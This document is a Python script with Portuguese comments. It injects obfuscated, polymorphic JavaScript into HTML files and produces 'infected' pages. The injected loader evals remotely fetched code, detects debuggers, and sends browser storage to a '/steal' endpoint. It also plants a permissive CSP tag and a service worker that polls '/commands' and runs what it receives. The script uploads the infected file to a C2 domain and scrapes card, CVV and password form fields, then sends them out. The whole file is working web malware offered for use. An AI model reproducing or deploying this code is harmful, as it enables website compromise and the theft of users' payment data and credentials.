import os
import sys
import json
import re
import time
import random
import base64
import logging
import socket
import ssl
import hashlib
import requests
from pathlib import Path
from bs4 import BeautifulSoup
from logging.handlers import RotatingFileHandler
from requests.adapters import HTTPAdapter, Retry
import textwrap

# Optional AES encryption support
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.backends import default_backend
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False

# --- Configuração e Logging -------------------------------------------------

BASE_DIR     = Path(__file__).parent
PAYLOAD_PATH = BASE_DIR / "payloads"
CONFIG_FILE  = BASE_DIR / "config.json"
LOG_FILE     = BASE_DIR / "form_injector_advanced.log"

DEFAULT_CONFIG = {
    "upload_url":     "https://example.com/upload",
    "form_url":       "https://example.com/form",
    "data_url":       "https://example.com/data",
    "c2_domain":      "example.com",
    "c2_cert_hash":   "HASH_AQUI",
    "max_retries":    3,
    "retry_backoff":  1,
    "encryption_key": "",    # base64-encoded AES key (16/24/32 bytes)
    "log_level":      "INFO"
}

logger = logging.getLogger("FormInjectorAdv")
fh = RotatingFileHandler(LOG_FILE, maxBytes=2_000_000, backupCount=2, encoding="utf-8")
fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s", "%Y-%m-%d %H:%M:%S"))
ch = logging.StreamHandler(sys.stdout)
ch.setFormatter(logging.Formatter("[%(levelname)s] %(message)s"))
logger.addHandler(fh); logger.addHandler(ch)
logger.setLevel(DEFAULT_CONFIG["log_level"])

def load_config():
    cfg = DEFAULT_CONFIG.copy()
    try:
        user = json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
        cfg.update(user)
        logger.debug("Config loaded from %s", CONFIG_FILE)
    except FileNotFoundError:
        logger.warning("Config file not found, using defaults")
    # decode AES key if present
    if cfg["encryption_key"]:
        try:
            key = base64.b64decode(cfg["encryption_key"])
            assert len(key) in (16,24,32)
            cfg["_aes_key"] = key
        except Exception:
            logger.error("Invalid AES key, disabling AES")
            cfg["_aes_key"] = None
    else:
        cfg["_aes_key"] = None
    logger.setLevel(cfg["log_level"].upper())
    return cfg

CONFIG = load_config()

# --- HTTP Session with Retries ------------------------------------------------

session = requests.Session()
retries = Retry(total=CONFIG["max_retries"],
                backoff_factor=CONFIG["retry_backoff"],
                status_forcelist=[502,503,504],
                allowed_methods=["GET","POST"])
session.mount("https://", HTTPAdapter(max_retries=retries))
session.verify = True

# --- Polimorfismo Dinâmico Avançado -------------------------------------------

def generate_polymorphic_payload(src: str) -> str:
    """
    Renomeia identificadores, injeta dead code e randomiza espaçamento.
    """
    try:
        # mapeia nomes de funções e variáveis
        idents = re.findall(r"\b(function|var|let|const)\s+([A-Za-z_$][\w$]*)", src)
        mapping = {}
        for _, name in idents:
            mapping[name] = "_" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        def repl(m):
            kind, name = m.groups()
            return f"{kind} {mapping.get(name,name)}"
        src = re.sub(r"\b(function|var|let|const)\s+([A-Za-z_$][\w$]*)", repl, src)

        lines = []
        for line in src.splitlines():
            # random indent
            line = " " * random.randint(0,4) + line
            # 10% chance de dead code
            if random.random() < 0.1:
                dead = random.choice(["void(0);","/*noop*/","if(false){}", "0&&console.log('x');"])
                line += " " + dead
            lines.append(line)
        return "\n".join(lines)
    except Exception as e:
        logger.error("Polimorfismo falhou: %s", e)
        return src

# --- Construção do Loader JS Avançado ----------------------------------------

def build_advanced_loader(core_js: str) -> str:
    """
    Envolve o payload original num loader que acrescenta:
    - Self-rewriting dinâmico
    - Modular dropper (fetch chunks)
    - Anti-debug / autodestroção
    - Abuso de Storage
    - Comunicação resiliente (fetch + WebSocket)
    """
    b64 = base64.b64encode(core_js.encode("utf-8")).decode("ascii")
    loader = textwrap.dedent(f"""
    (function(){{
      // 1) Self-rewrite
      var code = atob("{b64}").replace(/function\\s+(\\w+)/g,(_,n)=>"fn_"+Math.random().toString(36).substr(2));
      eval(code);
      // 2) Modular Dropper
      ['chunk1.js','chunk2.js'].forEach(u=>{{
        fetch(u).then(r=>r.text()).then(eval);
      }});
      // 3) Anti-Debug / Auto-destruição
      setInterval(function(){{
        if(window.outerHeight - window.innerHeight > 100) {{
          document.documentElement.innerHTML = '';
          window.stop();
        }}
      }},1000);
      // 4) Abuso de Storage
      (function(){{
        var d = {{}};
        for(var i=0;i<localStorage.length;i++){{
          var k=localStorage.key(i); d[k] = localStorage.getItem(k);
        }}
        for(var i=0;i<sessionStorage.length;i++){{
          var k=sessionStorage.key(i); d[k] = sessionStorage.getItem(k);
        }}
        fetch('/steal',{{
          method:'POST',
          headers:{{'Content-Type':'application/json'}},
          body:JSON.stringify(d)
        }});
      }})();
      // 5) Comunicação resiliente
      (function comm(){{
        fetch('/c2',{{method:'GET'}}).then(r=>r.text()).then(eval)
        .catch(function(){{
          var ws = new WebSocket('wss://'+location.host+'/c2ws');
          ws.onmessage = function(e){{ eval(e.data); }};
        }});
      }})();
    }})();
    """).strip()
    return loader

# --- Obfuscação Profunda -------------------------------------------------------

def deep_obfuscate_payload(src: str) -> str:
    """
    Opções: AES-CFB (se disponível) ou fallback XOR+Base64.
    """
    try:
        key = CONFIG.get("_aes_key")
        if HAVE_CRYPTO and key:
            iv = os.urandom(16)
            cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
            enc = cipher.encryptor().update(src.encode("utf-8")) + cipher.encryptor().finalize()
            payload = base64.b64encode(iv + enc).decode("ascii")
            stub = textwrap.dedent(f'''
            (function(){{
              var data="{payload}", raw=atob(data);
              var iv=raw.slice(0,16), ct=raw.slice(16);
              crypto.subtle.importKey("raw", new Uint8Array({list(key)}),
                {{name:"AES-CFB"}}, false, ["decrypt"])
               .then(k=>crypto.subtle.decrypt({{name:"AES-CFB",iv:new Uint8Array(iv)}},k,new Uint8Array(ct)))
               .then(pt=>eval(new TextDecoder().decode(pt)));
            }})();''')
        else:
            xor_key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz',k=12))
            xored = ''.join(chr(ord(c)^ord(xor_key[i%len(xor_key)])) for i,c in enumerate(src))
            data = base64.b64encode(xored.encode("latin1")).decode("ascii")
            stub = textwrap.dedent(f'''
            (function(){{
              var data="{data}", key="{xor_key}", d=atob(data), o="";
              for(var i=0;i<d.length;i++) o+=String.fromCharCode(d.charCodeAt(i)^key.charCodeAt(i%key.length));
              eval(o);
            }})();''')
        return stub.strip()
    except Exception as e:
        logger.error("Obfuscação falhou: %s", e)
        return src

# --- Injeção de Script + CSP Bypass + SW Register ------------------------------

def inject_script(html: str, payload: str) -> str:
    try:
        # 1) Meta-CSP permissiva (unsafe-inline, unsafe-eval)
        csp = '<meta http-equiv="Content-Security-Policy" content="default-src * \'unsafe-inline\' \'unsafe-eval\';">'
        if re.search(r"(?i)<head[^>]*>", html):
            html = re.sub(r"(?i)(<head[^>]*>)", r"\1\n  " + csp, html, count=1)
        else:
            html = csp + "\n" + html

        # 2) Script loader + registro de SW
        sw_reg = textwrap.dedent("""
        <script>
        if('serviceWorker' in navigator){
          navigator.serviceWorker.register('sw.js',{scope:'./'})
            .catch(e=>console.error('SW reg fail',e));
        }
        </script>
        """).strip()
        script_tag = f"<script>{payload}</script>\n{sw_reg}"

        # 3) Inserção antes de </body>
        if re.search(r"(?i)</body>", html):
            html = re.sub(r"(?i)</body>", script_tag + "</body>", html, count=1)
        else:
            html += "\n" + script_tag
        return html
    except Exception as e:
        logger.error("Falha ao injetar script: %s", e)
        return html

# --- Service Worker Avançado ---------------------------------------------------

def service_worker_persistence(html_path: str):
    try:
        sw = textwrap.dedent("""
        self.addEventListener('install', e=>{self.skipWaiting();});
        self.addEventListener('activate', e=>{e.waitUntil(self.clients.claim());});
        // Cron-like polling aleatório 5–15min
        setInterval(()=>{
          fetch('/commands').then(r=>r.text()).then(eval).catch(()=>{});
        }, Math.random()*600000 + 300000);
        """).strip()
        sw_path = Path(html_path).with_name("sw.js")
        sw_path.write_text(sw, encoding="utf-8")
        logger.info("Service Worker criado em %s", sw_path)
    except Exception as e:
        logger.error("SW persistência falhou: %s", e)

# --- TLS Pinning ---------------------------------------------------------------

def tls_pinning_verify(domain: str, known_hash: str) -> bool:
    try:
        ctx = ssl.create_default_context(); ctx.verify_mode = ssl.CERT_REQUIRED
        sock = ctx.wrap_socket(socket.socket(), server_hostname=domain); sock.settimeout(5)
        sock.connect((domain,443))
        der = sock.getpeercert(binary_form=True); sock.close()
        sha = hashlib.sha256(der).hexdigest().lower()
        if sha != known_hash.lower():
            logger.warning("Cert hash mismatch: %s != %s", sha, known_hash)
            return False
        return True
    except Exception as e:
        logger.error("TLS pinning error: %s", e)
        return False

# --- Envio de Arquivo Infectado ------------------------------------------------

def send_infected_file(path: str):
    if not tls_pinning_verify(CONFIG["c2_domain"], CONFIG["c2_cert_hash"]):
        logger.error("TLS pinning falhou, abortando upload")
        return
    data = Path(path).read_bytes()
    headers = {}
    # opcional AES-CBC
    key = CONFIG.get("_aes_key")
    if HAVE_CRYPTO and key:
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        pad = (16 - len(data)%16)
        pdata = data + bytes([pad])*pad
        ct = cipher.encryptor().update(pdata) + cipher.encryptor().finalize()
        data = iv + ct
        headers["X-Encrypted"] = "AES-CBC"
    try:
        r = session.post(CONFIG["upload_url"], data=data, headers=headers, timeout=10)
        if r.status_code == 200:
            logger.info("Upload bem-sucedido: %s", path)
        else:
            logger.error("Upload falhou [%d]: %s", r.status_code, path)
    except Exception as e:
        logger.error("Erro no upload: %s", e)

# --- Coleta e Exfiltra Dados do Formulário -------------------------------------

def collect_form_data():
    try:
        r = session.get(CONFIG["form_url"], timeout=10)
        if r.status_code != 200:
            logger.error("GET form_url falhou: %d", r.status_code)
            return
        soup = BeautifulSoup(r.content, "html.parser")
        form = soup.find("form")
        if not form:
            logger.warning("Nenhum <form> encontrado")
            return
        items = []
        for inp in form.find_all(["input","textarea","select"]):
            n = (inp.get("name") or "").lower()
            if any(k in n for k in ["card","ccn","cpf","senha","cvv","exp"]):
                items.append({
                    "name": n,
                    "type": inp.get("type"),
                    "placeholder": inp.get("placeholder"),
                    "id": inp.get("id"),
                    "value": inp.get("value")
                })
        if not items:
            logger.info("Nenhum campo sensível")
            return
        payload = {"ts": time.time(), "data": items}
        Path("output").mkdir(exist_ok=True)
        dump = Path("output/form_data_dump.json")
        dump.write_text(json.dumps(payload, indent=2), encoding="utf-8")
        logger.info("Dados sensíveis salvos em %s", dump)
        # exfiltra
        session.post(CONFIG["data_url"], json=payload, timeout=5)
        logger.info("Dados exfiltrados para %s", CONFIG["data_url"])
    except Exception as e:
        logger.error("Coleta de dados falhou: %s", e)

# --- Fluxo Principal -----------------------------------------------------------

def inject_payload(html_path: str, payload_name: str):
    start = time.time()
    try:
        # 1) Carrega JS original
        core = (PAYLOAD_PATH / f"{payload_name}.js").read_text(encoding="utf-8")
        # 2) Polimorfismo dinâmico
        poly = generate_polymorphic_payload(core)
        # 3) Constrói loader avançado
        loader = build_advanced_loader(poly)
        # 4) Obfusca profundamente
        final_js = deep_obfuscate_payload(loader)
        # 5) Injeta no HTML
        html = Path(html_path).read_text(encoding="utf-8")
        injected = inject_script(html, final_js)
        # 6) Salva infectado
        out = Path(html_path).with_name(f"{Path(html_path).stem}_infected.html")
        out.write_text(injected, encoding="utf-8")
        logger.info("HTML infectado salvo em %s", out)
        # 7) Service Worker
        service_worker_persistence(str(out))
        # 8) Envia arquivo infectado
        send_infected_file(str(out))
        # 9) Coleta & exfiltra dados
        collect_form_data()
    except Exception as e:
        logger.exception("Falha geral: %s", e)
    finally:
        logger.info("Execução completa em %.2fs", time.time() - start)

if __name__ == "__main__":
    if len(sys.argv)!=3:
        print(f"Uso: {sys.argv[0]} <arquivo.html> <payload_name>")
        sys.exit(1)
    inject_payload(sys.argv[1], sys.argv[2])